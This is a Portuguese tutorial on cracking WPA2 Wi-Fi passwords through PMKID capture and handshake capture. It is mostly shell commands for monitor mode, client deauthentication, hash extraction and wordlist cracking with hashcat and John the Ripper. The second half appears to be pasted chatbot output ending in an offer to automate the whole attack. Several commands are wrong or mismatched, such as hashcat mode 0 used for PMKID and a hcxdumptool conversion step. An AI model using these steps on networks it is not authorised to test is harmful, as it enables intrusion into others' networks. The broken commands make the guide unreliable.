# Crackeando Wi-Fi via PMKID
---
Geralmente em um ataque Wi-Fi, uma das principais técnicas utilizadas é a **captura e crack do Handshake**, porém, há um problema nisso...

Para capturar o handshake é necessário que **alguém esteja conectado na rede**, ou seja, em uma rede sem nenhum dispositivo isso não funciona.
---
## Requisitos

- **Noção basicas de redes de computadores**
  - O conteúdo vai solicitar conhecimento básico de redes Wi-Fi.
- **Noção básica de comandos em terminal do Linux**
  - Vai ser necessário para fazer a instalação de pacotes e para que você identifique a interface Wi-Fi que vai utilizar para o próximos passos.
- **Ter uma maquina, seja ela fisica ou virtual, com Kali Linux**
  - O meu conteúdo aborda o conceito tendo que você já tenha o pacote do `AIRCRACK` já devidamente instalado em seu Kali Linux.
- **Máquina com conexão Wi-Fi (Interna ou Externa), compativel com WPA 2.**
---
## O que é o PMKID?

PMKID é um identificado usado durante o processo de autenticação WPA2. Ele pode ser capturado **sem que haja dispositivos conectados** a rede.

Com o PKMID crackeado, é possivel *obter a senha* dessa rede.
---
## Ambiente

Para realizar esse ataque é necessário **instalar algumas ferramentas**.
Vamos começar pelas abaixo:

''' bash
sudo apt -y install hcxdumptool hxctools
'''

** Essas ferramentas são **essenciais** para o ataque.
---
## Modo *MONITOR*

O próximo passo é adicionar a sua placa de rede Wi-Fi em **modo monitor**, isso pode ser feito usando o `airmon-ng`.

''' bash
airmon-ng check kill
airmon-ng start <interface>
'''

Agora vamos **iniciar** o ataque.
---
## Exploção

É importante eu ressaltar para você que está lendo esse conteúdo e não tem a minima ideia das terminologias, que **exploração** é quando iniciamos a fase de analise e de ataque de um determinado alvo (ou target, que vem do inglês).

Inicie um scan redes Wi-Fi usando o comando `airdump-ng` e obtenha o **BSSID** do alvo.

'''bash
airmon-ng <interface>
'''

Com a rede alvo aparecendo, vamos agora criar um **arquivo BPF** com o **BSSID** da rede alvo.
---
## Criando BPF

Para **criar o arquivo** BPF, podemos usar o próprio `hcxdumptool` com o BSSID capturado anteriormente.

'''bash
hcxdumptool --bpfc="wlan addr3 <BSSID>" > SSID.bpf
'''

Após criar o arquivo, basta usa-lo como **filtro de redes** Wi-Fi.

'''bash
hcxdumptool --rds=1 -F --bpf=SSID.bpf -i <interface> -w outfile.pcapng
'''
---
## Convertendo *HASH*

Observer que na **tela anterior** contém um **+** ao lado da rede, isso indica a captura do PMKID. Porém, é necessário **obter o hash** do arquivo pcapng.

'''bash
hcxdumptool -o pmkid.hash dump.pcapng
'''
---
## Quebrando *HASH*

Para converter o **HASH** obtido para a senha real, vamos usar a ferramenta `HASHCAT` ou o `JOHN, THE RIPPER` (você escolhe a que for melhor para você).

Contexto do comando para HASH MD5:
hashcat -m [ID DO HASH] -a [MODO DE ATAQUE] [ARQUIVO COM A HASH] [WORDLIST]

No nosso caso, você precisa está com a **wordlist RockYou**, pode ser achada facilmente no Github.

'''bash
hashcat -m 0 -a 0 pmkid.hash rockyou.txt
'''

Uma outra linha que pode auxiliar:
'''bash
sudo apt install hashcat-utils
cap2hccapx pcapng.pcapng captura.hccapx
hashcat -m 22000 -a 0 pmkid.hccapx /usr/share/wordlists/rockyou.txt --force
hashcat -m 22000 pmkid.hccapx --show
'''

Caso queira usar o novo formato para o Hashcat:

'''bash
hcxpcapngtool -o rede.22000 captura.cap
hashcat -m 22000 -a 0 rede.22000 wordlist.txt
'''

## Usando o John, The Ripper

Quebrar senhas de Wi-Fi protegidas com **WPA2** usando o **John the Ripper** é menos comum do que com o Hashcat, mas é perfeitamente possível — especialmente usando o **modo Jumbo** do John, que adiciona suporte a formatos como WPA/WPA2.

A seguir, te mostro o processo completo para fazer isso com elegância técnica e respeito aos velhos ritos da segurança ofensiva.

---

## ⚔️ **Objetivo**: Quebrar senha de rede WPA2 com **John the Ripper**

---

## 🔧 Pré-requisitos

1. **Placa de rede com modo monitor**.
2. Ferramentas necessárias:

   * [`aircrack-ng`](https://www.aircrack-ng.org/)
   * [`John the Ripper Jumbo`](https://github.com/openwall/john)
   * [`hcxtools`](https://github.com/ZerBea/hcxtools)

---

## 🧙‍♂️ Etapas do Ritual

### 1. **Capture o Handshake com `airodump-ng`**

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

Identifique a rede alvo (**BSSID** e **canal**), depois:

```bash
sudo airodump-ng --bssid <BSSID> -c <CH> -w captura wlan0mon
```

E então, deauth no cliente:

```bash
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

Isso capturará o handshake como `captura.cap`.

---

### 2. **Converter o .cap para formato John: `.hccapx` ou `.wpapsk`**

Primeiro, instale os conversores:

```bash
sudo apt install hcxtools
```

Converta para o formato compatível:

```bash
hcxpcapngtool -o rede.22000 captura.cap
```

Depois, converta para `.john` com o utilitário do John:

```bash
/usr/share/john/hcx2john.py rede.22000 > rede.john
```

> 🔎 Este arquivo já está no formato que o John entende para WPA/WPA2.

---

### 3. **Execute o John the Ripper com Wordlist**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt rede.john --format=wpapsk
```

* `--format=wpapsk`: Modo para WPA-PSK
* `--wordlist`: Caminho da wordlist (você pode usar sua própria)

---

### 4. **Verifique a senha descoberta**

```bash
john --show --format=wpapsk rede.john
```

---

## 🛠️ Dica: Compilando o John Jumbo no Linux

Se precisar compilar o John em sua versão completa:

```bash
sudo apt install git build-essential libssl-dev zlib1g-dev yasm
git clone https://github.com/openwall/john.git
cd john/src
./configure && make -s clean && make -sj4
```

A versão compilada ficará em `john/run/`.

---

## ⚠️ Aviso Legal

> 🛡️ Use apenas em redes **sob sua autorização explícita** (como laboratórios, testes contratados ou sua própria rede). Qualquer uso não autorizado pode configurar **crime**.

---

Se desejar, posso gerar um **script Bash completo** que faça todas essas etapas automaticamente. Deseja que eu prepare isso?


O resultado final vai mostrar a senha real da rede.